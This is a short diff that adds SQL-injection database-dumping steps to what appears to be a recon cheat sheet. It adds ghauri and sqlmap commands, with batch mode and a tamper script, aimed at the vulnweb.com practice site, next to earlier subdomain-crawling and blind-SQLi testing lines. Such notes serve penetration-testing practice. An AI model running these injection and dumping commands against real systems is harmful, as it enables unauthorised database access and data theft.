@@ -21,3 +21,15 @@ subfinder -d "vulnweb.com" -recursive -all -silent | katana -d 5 -ps -pss waybac
 ```
 bsqli --urls vulnweb.com.sql.parameters.txt --payloads payloads/xor.txt --verbose --save vulnweb.com.detected.sql.parameters.txt
 ```
+
+## Ghauri DB Dumping
+
+```
+ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --confirm --current-db --dbs
+```
+
+## SQLMAP DB Dumping
+
+```
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=*" --batch --dbs --random-agent --tamper=space2comment --level=2
+```
